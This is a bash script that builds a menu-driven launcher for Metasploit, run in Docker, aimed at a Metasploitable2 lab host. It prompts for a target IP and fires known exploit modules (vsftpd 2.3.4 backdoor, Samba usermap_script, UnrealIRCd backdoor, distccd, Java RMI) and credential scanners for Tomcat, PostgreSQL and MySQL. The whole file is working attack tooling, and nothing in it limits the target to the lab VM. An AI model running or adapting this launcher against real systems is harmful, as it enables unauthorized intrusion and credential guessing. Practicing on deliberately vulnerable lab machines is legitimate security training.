#!/bin/bash
# ============================================================
# Metasploit Attack Menu — TUI
# Description : Whiptail menu for launching known Metasploitable2
#               exploit modules through the Metasploit Framework
#               Docker container. Does no installation — run
#               setup_prereqs.sh once first (Docker, whiptail,
#               and the msf image).
# Usage       : sudo bash setup_attacker.sh
# ============================================================

CONTAINER_NAME="msf"
IMAGE="metasploitframework/metasploit-framework"
MSF_DATA="$HOME/.msf4"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ============================================================
# STEP 0: Confirm prerequisites are in place
# ============================================================
if ! command -v docker &> /dev/null || ! command -v whiptail &> /dev/null; then
  echo -e "${RED}[ERROR] Docker and/or whiptail not found.${NC}"
  echo -e "${YELLOW}[HINT] Run the one-time setup first:${NC}"
  echo -e "  sudo bash setup_prereqs.sh"
  exit 1
fi

# ============================================================
# STEP 1: Ask for target IP
# ============================================================
TARGET_IP=$(whiptail --title "Metasploit Attack Menu" \
  --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "192.168.2.20" \
  3>&1 1>&2 2>&3)
if [ $? -ne 0 ] || [ -z "$TARGET_IP" ]; then
  echo -e "${RED}[ERROR] No target IP provided. Aborting.${NC}"
  exit 1
fi

LHOST=$(hostname -I | awk '{print $1}')

# ============================================================
# STEP 2: Attack menu loop — pick a module, run it, repeat
# ============================================================
while true; do
  CHOICE=$(whiptail --title "Metasploit Attack Menu — Target: $TARGET_IP" \
    --menu "Choose an exploit to launch:" 21 78 10 \
    "1" "FTP Backdoor - vsftpd 2.3.4 (port 21)" \
    "2" "Samba usermap_script (port 445)" \
    "3" "UnrealIRCd Backdoor (port 6667)" \
    "4" "distccd Command Execution (port 3632)" \
    "5" "Java RMI Server (port 1099)" \
    "6" "Tomcat Manager login scan (port 8180)" \
    "7" "PostgreSQL weak credentials (port 5432)" \
    "8" "MySQL no root password (port 3306)" \
    "9" "Open msfconsole (manual / free-form)" \
    3>&1 1>&2 2>&3)

  if [ $? -ne 0 ] || [ -z "$CHOICE" ]; then
    echo -e "${YELLOW}[INFO] Exiting attack menu.${NC}"
    break
  fi

  case "$CHOICE" in
    1) MSF_CMD="use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET_IP; run" ;;
    2) MSF_CMD="use exploit/multi/samba/usermap_script; set RHOSTS $TARGET_IP; run" ;;
    3) MSF_CMD="use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $TARGET_IP; run" ;;
    4) MSF_CMD="use exploit/unix/misc/distcc_exec; set RHOSTS $TARGET_IP; run" ;;
    5) MSF_CMD="use exploit/multi/misc/java_rmi_server; set RHOSTS $TARGET_IP; run" ;;
    6) MSF_CMD="use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS $TARGET_IP; set RPORT 8180; run" ;;
    7) MSF_CMD="use auxiliary/scanner/postgres/postgres_login; set RHOSTS $TARGET_IP; run" ;;
    8) MSF_CMD="use auxiliary/scanner/mysql/mysql_login; set RHOSTS $TARGET_IP; set USERNAME root; run" ;;
    9) MSF_CMD="" ;;
  esac

  FULL_CMD="setg LHOST $LHOST; setg RHOSTS $TARGET_IP"
  if [ -n "$MSF_CMD" ]; then
    FULL_CMD="$FULL_CMD; $MSF_CMD"
  fi

  echo -e "\n${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}${NC}"
  echo -e "${CYAN}[INFO] Target IP   (RHOSTS): ${TARGET_IP}${NC}"

  docker run -it --rm \
    --name "$CONTAINER_NAME" \
    --network host \
    -e LHOST="$LHOST" \
    -e RHOSTS="$TARGET_IP" \
    -v "$MSF_DATA":/home/msf/.msf4 \
    "$IMAGE" \
    msfconsole -q -x "$FULL_CMD"

  if ! whiptail --title "Metasploit Attack Menu" --yesno "Run another module against $TARGET_IP?" 8 60; then
    break
  fi
done

echo -e "\n${GREEN}Session ended. MSF data preserved at: $MSF_DATA${NC}"
